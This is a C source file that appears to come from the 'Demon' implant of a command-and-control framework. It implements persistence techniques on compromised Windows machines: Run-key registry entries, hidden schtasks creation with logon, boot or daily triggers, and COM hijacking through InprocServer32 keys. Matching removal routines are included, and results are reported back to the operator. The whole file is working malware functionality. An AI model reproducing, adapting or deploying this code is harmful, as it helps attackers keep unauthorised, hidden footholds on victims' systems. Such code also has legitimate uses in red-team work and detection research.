#include <Demon.h>
#include <common/Macros.h>
#include <core/Command.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/Parser.h>
#include <commands/Command_Persist.h>

/* --------------------------------------------------------------------
 * Local typedefs for registry and process Win32 functions.
 * All function pointers in Instance->Win32 are PVOID; cast before call.
 * -------------------------------------------------------------------- */
typedef LONG    ( WINAPI *fnRegOpenKeyExW    )( HKEY, LPCWSTR, DWORD, REGSAM, PHKEY );
typedef LONG    ( WINAPI *fnRegCreateKeyExW  )( HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD );
typedef LONG    ( WINAPI *fnRegSetValueExW   )( HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD );
typedef LONG    ( WINAPI *fnRegDeleteValueW  )( HKEY, LPCWSTR );
typedef LONG    ( WINAPI *fnRegDeleteTreeW   )( HKEY, LPCWSTR );
typedef LONG    ( WINAPI *fnRegCloseKey      )( HKEY );
typedef BOOL    ( WINAPI *fnCreateProcessW   )( LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION );
typedef DWORD   ( WINAPI *fnWaitForSingleObjectEx )( HANDLE, DWORD, BOOL );
typedef BOOL    ( WINAPI *fnGetExitCodeProcess )( HANDLE, LPDWORD );
typedef BOOL    ( WINAPI *fnCloseHandle      )( HANDLE );

/* Run a command line via CreateProcessW and wait for it to exit.
 * Returns TRUE if the process exited with code 0, FALSE otherwise.
 * hProcess and hThread are always closed before returning. */
static BOOL PersistRunProcess( PWCHAR CmdLine )
{
    STARTUPINFOW        Si          = { 0 };
    PROCESS_INFORMATION Pi          = { 0 };
    DWORD               ExitCode    = 1;
    BOOL                Ok          = FALSE;

    /* guard all required function pointers before any call */
    if ( !Instance->Win32.CreateProcessW      ) { return FALSE; }
    if ( !Instance->Win32.WaitForSingleObjectEx ) { return FALSE; }
    if ( !Instance->Win32.GetExitCodeProcess  ) { return FALSE; }

    Si.cb          = sizeof( STARTUPINFOW );
    Si.dwFlags     = STARTF_USESHOWWINDOW;
    Si.wShowWindow = SW_HIDE;

    Ok = ( (fnCreateProcessW) Instance->Win32.CreateProcessW )(
        NULL, CmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &Si, &Pi );

    if ( !Ok ) {
        return FALSE;
    }

    /* wait up to 10 seconds for schtasks.exe to complete */
    ( (fnWaitForSingleObjectEx) Instance->Win32.WaitForSingleObjectEx )(
        Pi.hProcess, 10000, FALSE );

    ( (fnGetExitCodeProcess) Instance->Win32.GetExitCodeProcess )(
        Pi.hProcess, &ExitCode );

    /* close handles on all paths */
    SysNtClose( Pi.hThread );
    SysNtClose( Pi.hProcess );

    return ( ExitCode == 0 );
}

/* CommandPersist
 * Dispatcher for all DEMON_COMMAND_PERSIST sub-commands.
 * Parser layout: SubCommand(int32) [sub-specific fields follow]
 * Transmits exactly one package before returning. */
VOID CommandPersist( IN PPARSER DataArgs )
{
    SHORT    SubCommand = ( SHORT ) ParserGetInt32( DataArgs );
    PPACKAGE Package    = PackageCreate( DEMON_COMMAND_PERSIST );

    PackageAddInt32( Package, SubCommand );

    switch ( SubCommand )
    {
        /* ------------------------------------------------------------------
         * persist reg
         * Parser: Name(wstring), Value(wstring), Hive(int32 - 0=HKCU 1=HKLM)
         * Writes a REG_SZ value to the Run key of the chosen hive.
         * ------------------------------------------------------------------ */
        case DEMON_PERSIST_REG: PUTS( "Persist::Reg" )
        {
            UINT32  NameLen  = 0;
            UINT32  ValLen   = 0;
            PWCHAR  Name     = ParserGetWString( DataArgs, &NameLen );
            PWCHAR  Value    = ParserGetWString( DataArgs, &ValLen );
            INT32   Hive     = ParserGetInt32( DataArgs );

            if ( !Name || NameLen == 0 || !Value || ValLen == 0 ) {
                PUTS( "Persist::Reg - missing Name or Value" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            HKEY    RootKey  = ( Hive == 1 ) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
            HKEY    hKey     = NULL;
            LONG    Res      = 0;

            /* Run key path for both HKCU and HKLM */
            LPCWSTR RunPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

            /* guard function pointers */
            if ( !Instance->Win32.RegOpenKeyExW || !Instance->Win32.RegSetValueExW || !Instance->Win32.RegCloseKey ) {
                PUTS( "Persist::Reg - missing Win32 function pointer" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            Res = ( (fnRegOpenKeyExW) Instance->Win32.RegOpenKeyExW )(
                RootKey, RunPath, 0, KEY_SET_VALUE, &hKey );

            if ( Res != ERROR_SUCCESS ) {
                PRINTF( "RegOpenKeyExW failed: %d\n", Res )
                PackageAddInt32( Package, FALSE );
                PACKAGE_ERROR_WIN32
                break;
            }

            /* value data length in bytes, including null terminator */
            DWORD DataLen = (DWORD)( ( StringLengthW( Value ) + 1 ) * sizeof( WCHAR ) );

            Res = ( (fnRegSetValueExW) Instance->Win32.RegSetValueExW )(
                hKey, Name, 0, REG_SZ, (BYTE*) Value, DataLen );

            ( (fnRegCloseKey) Instance->Win32.RegCloseKey )( hKey );
            hKey = NULL;

            PackageAddInt32( Package, ( Res == ERROR_SUCCESS ) ? TRUE : FALSE );
            if ( Res != ERROR_SUCCESS ) {
                PRINTF( "RegSetValueExW failed: %d\n", Res )
                PACKAGE_ERROR_WIN32
            }

            break;
        }

        /* ------------------------------------------------------------------
         * persist schtask
         * Parser: TaskName(wstring), Command(wstring), Trigger(wstring)
         * Trigger: "logon", "boot", or "time:HH:MM"
         * Spawns schtasks.exe /create to avoid unsafe COM ITaskService API.
         * ------------------------------------------------------------------ */
        case DEMON_PERSIST_SCHTASK: PUTS( "Persist::SchTask" )
        {
            UINT32 TaskNameLen = 0;
            UINT32 CmdLen      = 0;
            UINT32 TrigLen     = 0;
            PWCHAR TaskName    = ParserGetWString( DataArgs, &TaskNameLen );
            PWCHAR Command     = ParserGetWString( DataArgs, &CmdLen );
            PWCHAR Trigger     = ParserGetWString( DataArgs, &TrigLen );

            if ( !TaskName || TaskNameLen == 0 || !Command || CmdLen == 0 || !Trigger || TrigLen == 0 ) {
                PUTS( "Persist::SchTask - missing required field" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            /* guard CreateProcessW before building the command line */
            if ( !Instance->Win32.CreateProcessW || !Instance->Win32.WaitForSingleObjectEx || !Instance->Win32.GetExitCodeProcess ) {
                PUTS( "Persist::SchTask - missing Win32 function pointer" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            /* build the schtasks command line into a heap buffer
             * max = "schtasks /create /tn " + quoted name(256) + " /tr " +
             *       quoted command(512) + " /sc ONLOGON /f" + NUL
             * 1024 WCHARs is a conservative upper bound */
            PWCHAR  CmdBuf = (PWCHAR) MmHeapAlloc( 1024 * sizeof( WCHAR ) );
            if ( !CmdBuf ) {
                PUTS( "Persist::SchTask - MmHeapAlloc failed" )
                PackageAddInt32( Package, FALSE );
                break;
            }
            MemZero( CmdBuf, 1024 * sizeof( WCHAR ) );

            /* determine the schedule type from the trigger string */
            WCHAR SchedArg[ 64 ] = { 0 };
            if ( StringLengthW( Trigger ) >= 4 &&
                 Trigger[0] == L'b' && Trigger[1] == L'o' &&
                 Trigger[2] == L'o' && Trigger[3] == L't' )
            {
                /* boot trigger - fires when the system starts */
                StringCopyW( SchedArg, L"/sc ONSTART" );
            }
            else if ( StringLengthW( Trigger ) > 5 &&
                      Trigger[0] == L't' && Trigger[1] == L'i' &&
                      Trigger[2] == L'm' && Trigger[3] == L'e' &&
                      Trigger[4] == L':' )
            {
                /* time trigger - "time:HH:MM" - fires daily at the given time */
                StringCopyW( SchedArg, L"/sc DAILY /st " );
                StringConcatW( SchedArg, Trigger + 5 );
            }
            else
            {
                /* default: logon trigger */
                StringCopyW( SchedArg, L"/sc ONLOGON" );
            }

            /* assemble: schtasks /create /tn "TaskName" /tr "Command" <sched> /f */
            StringCopyW(  CmdBuf, L"schtasks /create /tn \"" );
            StringConcatW( CmdBuf, TaskName );
            StringConcatW( CmdBuf, L"\" /tr \"" );
            StringConcatW( CmdBuf, Command );
            StringConcatW( CmdBuf, L"\" " );
            StringConcatW( CmdBuf, SchedArg );
            StringConcatW( CmdBuf, L" /f" );

            PRINTF( "Persist::SchTask - cmd: %ls\n", CmdBuf )

            BOOL Ok = PersistRunProcess( CmdBuf );
            MmHeapFree( CmdBuf );

            PackageAddInt32( Package, Ok ? TRUE : FALSE );
            if ( !Ok ) {
                PACKAGE_ERROR_WIN32
            }

            break;
        }

        /* ------------------------------------------------------------------
         * persist com
         * Parser: CLSID_str(wstring), DllPath(wstring)
         * Writes HKCU\Software\Classes\CLSID\{clsid}\InprocServer32
         * so that a COM hijack loads DllPath when the CLSID is activated.
         * ------------------------------------------------------------------ */
        case DEMON_PERSIST_COM: PUTS( "Persist::Com" )
        {
            UINT32 ClsidLen   = 0;
            UINT32 DllPathLen = 0;
            PWCHAR ClsidStr   = ParserGetWString( DataArgs, &ClsidLen );
            PWCHAR DllPath    = ParserGetWString( DataArgs, &DllPathLen );

            if ( !ClsidStr || ClsidLen == 0 || !DllPath || DllPathLen == 0 ) {
                PUTS( "Persist::Com - missing CLSID or DllPath" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            HKEY   hKey       = NULL;
            DWORD  Disp       = 0;
            LONG   Res        = 0;

            /* guard function pointers */
            if ( !Instance->Win32.RegCreateKeyExW || !Instance->Win32.RegSetValueExW || !Instance->Win32.RegCloseKey ) {
                PUTS( "Persist::Com - missing Win32 function pointer" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            /* build registry key path under HKCU:
             * "Software\Classes\CLSID\{clsid}\InprocServer32" */
            WCHAR KeyPath[ 256 ] = { 0 };
            StringCopyW(  KeyPath, L"Software\\Classes\\CLSID\\" );
            StringConcatW( KeyPath, ClsidStr );
            StringConcatW( KeyPath, L"\\InprocServer32" );

            Res = ( (fnRegCreateKeyExW) Instance->Win32.RegCreateKeyExW )(
                HKEY_CURRENT_USER, KeyPath, 0, NULL,
                REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                NULL, &hKey, &Disp );

            if ( Res != ERROR_SUCCESS ) {
                PRINTF( "RegCreateKeyExW failed: %d\n", Res )
                PackageAddInt32( Package, FALSE );
                PACKAGE_ERROR_WIN32
                break;
            }

            /* default value = DllPath */
            DWORD DllLen = (DWORD)( ( StringLengthW( DllPath ) + 1 ) * sizeof( WCHAR ) );
            ( (fnRegSetValueExW) Instance->Win32.RegSetValueExW )(
                hKey, L"", 0, REG_SZ, (BYTE*) DllPath, DllLen );

            /* ThreadingModel = "Apartment" - required for InprocServer32 */
            WCHAR TM[] = L"Apartment";
            ( (fnRegSetValueExW) Instance->Win32.RegSetValueExW )(
                hKey, L"ThreadingModel", 0, REG_SZ,
                (BYTE*) TM, sizeof( TM ) );

            ( (fnRegCloseKey) Instance->Win32.RegCloseKey )( hKey );
            hKey = NULL;

            PackageAddInt32( Package, TRUE );

            break;
        }

        /* ------------------------------------------------------------------
         * persist remove
         * Parser: RemoveType(int32), Name(wstring)
         * RemoveType: 1=reg, 2=schtask, 3=com
         * ------------------------------------------------------------------ */
        case DEMON_PERSIST_REMOVE: PUTS( "Persist::Remove" )
        {
            INT32  RemoveType = ParserGetInt32( DataArgs );
            UINT32 NameLen    = 0;
            PWCHAR Name       = ParserGetWString( DataArgs, &NameLen );

            if ( !Name || NameLen == 0 ) {
                PUTS( "Persist::Remove - missing Name" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            switch ( RemoveType )
            {
                /* remove a Run key value from HKCU */
                case DEMON_PERSIST_REMOVE_REG: PUTS( "Persist::Remove::Reg" )
                {
                    /* No Hive field in the remove packet - HKCU only (no /system in UI). */
                    HKEY    RootKey = HKEY_CURRENT_USER;
                    HKEY    hKey    = NULL;
                    LONG    Res     = 0;

                    LPCWSTR RunPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

                    if ( !Instance->Win32.RegOpenKeyExW || !Instance->Win32.RegDeleteValueW || !Instance->Win32.RegCloseKey ) {
                        PUTS( "Persist::Remove::Reg - missing Win32 function pointer" )
                        PackageAddInt32( Package, FALSE );
                        break;
                    }

                    Res = ( (fnRegOpenKeyExW) Instance->Win32.RegOpenKeyExW )(
                        RootKey, RunPath, 0, KEY_SET_VALUE, &hKey );

                    if ( Res != ERROR_SUCCESS ) {
                        PRINTF( "RegOpenKeyExW failed: %d\n", Res )
                        PackageAddInt32( Package, FALSE );
                        PACKAGE_ERROR_WIN32
                        break;
                    }

                    Res = ( (fnRegDeleteValueW) Instance->Win32.RegDeleteValueW )( hKey, Name );

                    ( (fnRegCloseKey) Instance->Win32.RegCloseKey )( hKey );
                    hKey = NULL;

                    PackageAddInt32( Package, ( Res == ERROR_SUCCESS ) ? TRUE : FALSE );
                    if ( Res != ERROR_SUCCESS ) {
                        PRINTF( "RegDeleteValueW failed: %d\n", Res )
                        PACKAGE_ERROR_WIN32
                    }

                    break;
                }

                /* delete a scheduled task by name via schtasks /delete */
                case DEMON_PERSIST_REMOVE_SCHTASK: PUTS( "Persist::Remove::SchTask" )
                {
                    if ( !Instance->Win32.CreateProcessW || !Instance->Win32.WaitForSingleObjectEx || !Instance->Win32.GetExitCodeProcess ) {
                        PUTS( "Persist::Remove::SchTask - missing Win32 function pointer" )
                        PackageAddInt32( Package, FALSE );
                        break;
                    }

                    /* build: schtasks /delete /tn "Name" /f */
                    PWCHAR CmdBuf = (PWCHAR) MmHeapAlloc( 512 * sizeof( WCHAR ) );
                    if ( !CmdBuf ) {
                        PUTS( "Persist::Remove::SchTask - MmHeapAlloc failed" )
                        PackageAddInt32( Package, FALSE );
                        break;
                    }
                    MemZero( CmdBuf, 512 * sizeof( WCHAR ) );

                    StringCopyW(  CmdBuf, L"schtasks /delete /tn \"" );
                    StringConcatW( CmdBuf, Name );
                    StringConcatW( CmdBuf, L"\" /f" );

                    PRINTF( "Persist::Remove::SchTask - cmd: %ls\n", CmdBuf )

                    BOOL Ok = PersistRunProcess( CmdBuf );
                    MmHeapFree( CmdBuf );

                    PackageAddInt32( Package, Ok ? TRUE : FALSE );
                    if ( !Ok ) {
                        PACKAGE_ERROR_WIN32
                    }

                    break;
                }

                /* remove the COM hijack key tree from HKCU\Software\Classes\CLSID\{clsid} */
                case DEMON_PERSIST_REMOVE_COM: PUTS( "Persist::Remove::Com" )
                {
                    if ( !Instance->Win32.RegDeleteTreeW ) {
                        PUTS( "Persist::Remove::Com - missing Win32 function pointer" )
                        PackageAddInt32( Package, FALSE );
                        break;
                    }

                    /* build: "Software\Classes\CLSID\{clsid}" */
                    WCHAR KeyPath[ 256 ] = { 0 };
                    StringCopyW(  KeyPath, L"Software\\Classes\\CLSID\\" );
                    StringConcatW( KeyPath, Name );

                    LONG Res = ( (fnRegDeleteTreeW) Instance->Win32.RegDeleteTreeW )(
                        HKEY_CURRENT_USER, KeyPath );

                    PackageAddInt32( Package, ( Res == ERROR_SUCCESS ) ? TRUE : FALSE );
                    if ( Res != ERROR_SUCCESS ) {
                        PRINTF( "RegDeleteTreeW failed: %d\n", Res )
                        PACKAGE_ERROR_WIN32
                    }

                    break;
                }

                default: PUTS( "Persist::Remove - unknown remove type" )
                {
                    PackageAddInt32( Package, FALSE );
                    break;
                }
            }

            break;
        }

        default: PUTS( "Persist - unknown sub-command" )
        {
            PackageAddInt32( Package, FALSE );
            break;
        }
    }

    /* transmit exactly once */
    PackageTransmit( Package );
}
